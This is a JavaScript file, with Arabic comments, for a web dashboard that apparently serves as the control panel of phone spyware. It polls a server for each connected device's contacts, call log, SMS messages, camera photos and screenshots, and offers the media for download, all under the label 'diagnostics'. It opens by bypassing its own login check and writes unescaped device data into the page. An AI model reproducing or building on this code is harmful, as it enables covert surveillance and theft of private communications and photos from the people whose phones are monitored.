// تجاوز صفحة تسجيل الدخول والدخول للوحة مباشرة
sessionStorage.setItem('logged_in', 'true');

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;

// تسجيل الخروج
function logout() { 
    sessionStorage.removeItem('logged_in'); 
    window.location.reload(); 
}

// تحميل الأجهزة المتصلة من السيرفر
async function loadDevices() {
    try {
        const response = await fetch('/api/devices');
        const data = await response.json();
        const devices = data.devices || [];
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.model || device.id;
            select.appendChild(option);
        });
        
        if (currentValue) { 
            select.value = currentValue; 
        } else if (devices.length > 0 && !currentDevice) { 
            selectDevice(devices[0].id); 
            select.value = devices[0].id; 
        }
    } catch (e) {
        console.error("Error loading devices:", e);
    }
}

// اختيار جهاز محدد
function selectDevice(deviceId) {
    currentDevice = deviceId;
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 5000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 5000);
        updateLiveData();
        loadAllData();
    }
}

// تحديث حالة الاتصال
async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('netType');
        if (statusEl) {
            if (data.diagnostics && data.diagnostics.ping) {
                statusEl.textContent = 'متصل (Online) - آخر تحديث: ' + new Date(data.diagnostics.ping.updatedAt).toLocaleTimeString();
                statusEl.style.color = 'var(--green)';
            } else {
                statusEl.textContent = 'بانتظار البيانات...';
                statusEl.style.color = 'var(--yellow)';
            }
        }
    } catch (e) {
        const statusEl = document.getElementById('netType');
        if (statusEl) {
            statusEl.textContent = 'غير متصل';
            statusEl.style.color = 'var(--red)';
        }
    }
}

// تحميل كل البيانات وعرضها
async function loadAllData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        const diag = data.diagnostics || {};

        // 1. جهات الاتصال
        if (diag.contacts && Array.isArray(diag.contacts.items)) {
            const tbody = document.querySelector('#contactsTable tbody');
            if (tbody) {
                tbody.innerHTML = '';
                diag.contacts.items.forEach(item => {
                    const parts = item.split(':');
                    const name = parts[0] || 'غير معروف';
                    const phone = parts.slice(1).join(':').trim() || '';
                    tbody.innerHTML += `<tr><td>${name}</td><td>${phone}</td></tr>`;
                });
                // عرض العدد الكلي
                const header = document.querySelector('#contactsTab h3');
                if (header) header.textContent = `جهات الاتصال المخزنة (${diag.contacts.count || diag.contacts.items.length})`;
            }
        }

        // 2. سجل المكالمات
        if (diag.calls && Array.isArray(diag.calls.items)) {
            const tbody = document.querySelector('#callsTable tbody');
            if (tbody) {
                tbody.innerHTML = '';
                diag.calls.items.forEach(item => {
                    tbody.innerHTML += `<tr><td>سجل مكالمة</td><td>${item}</td></tr>`;
                });
                const header = document.querySelector('#callsTab h3');
                if (header) header.textContent = `سجل المكالمات (${diag.calls.count || diag.calls.items.length})`;
            }
        }

        // 3. الرسائل القصيرة
        if (diag.messages && Array.isArray(diag.messages.items)) {
            const tbody = document.querySelector('#messagesTable tbody');
            if (tbody) {
                tbody.innerHTML = '';
                diag.messages.items.forEach(item => {
                    tbody.innerHTML += `<tr><td>رسالة نصية</td><td>${item}</td></tr>`;
                });
                const header = document.querySelector('#messagesTab h3');
                if (header) header.textContent = `الرسائل النصية (${diag.messages.count || diag.messages.items.length})`;
            }
        }

        // 4. الوسائط (الصور ولقطات الشاشة)
        if (diag.media && Array.isArray(diag.media.items)) {
            const studioGallery = document.getElementById('studioGallery');
            const screenshotsGallery = document.getElementById('screenshotsGallery');
            
            if (studioGallery) studioGallery.innerHTML = '';
            if (screenshotsGallery) screenshotsGallery.innerHTML = '';

            let cameraCount = 0;
            let screenshotCount = 0;

            diag.media.items.forEach(filePath => {
                // عرض اسم الملف فقط (وليس المسار الكامل)
                const fileName = filePath.split('/').pop();
                
                // زر التحميل
                const downloadBtn = `<a href="${filePath}" download target="_blank" style="display:block; text-align:center; background:var(--green); color:#000; padding:4px 8px; border-radius:4px; text-decoration:none; font-size:11px; margin-top:5px;">⬇ تحميل</a>`;
                
                const card = `<div class="gallery-item">
                    <div style="width:100%; height:110px; background:#111; display:flex; align-items:center; justify-content:center; color:var(--green); font-size:24px;">📷</div>
                    <span style="font-size:10px; color:var(--muted); margin:4px 0; word-break:break-all; max-width:100%; text-align:center;">${fileName}</span>
                    ${downloadBtn}
                </div>`;
                
                if (filePath.includes('Screenshots')) {
                    if (screenshotsGallery) screenshotsGallery.innerHTML += card;
                    screenshotCount++;
                } else {
                    if (studioGallery) studioGallery.innerHTML += card;
                    cameraCount++;
                }
            });

            // عرض الأعداد
            const studioHeader = document.querySelector('#studioTab h3');
            if (studioHeader) studioHeader.textContent = `معرض الصور (DCIM / Camera) - ${cameraCount} صورة`;
            
            const screenshotHeader = document.querySelector('#screenshotsTab h3');
            if (screenshotHeader) screenshotHeader.textContent = `لقطات الشاشة (Screenshots) - ${screenshotCount} صورة`;
        }

        // 5. معلومات الشبكة
        if (diag.network && Array.isArray(diag.network.items)) {
            const netType = document.getElementById('netType');
            if (netType && diag.network.items.length > 0) {
                netType.textContent = diag.network.items.join(' | ');
                netType.style.color = 'var(--green)';
            }
        }

    } catch (e) {
        console.error("Error loading data:", e);
    }
}

// تبديل التبويبات
function switchTab(tabName) {
    document.querySelectorAll('.menu-btn').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    
    const activeBtn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
    if (activeBtn) activeBtn.classList.add('active');
    
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

// التهيئة
loadDevices();
setInterval(loadDevices, 10000);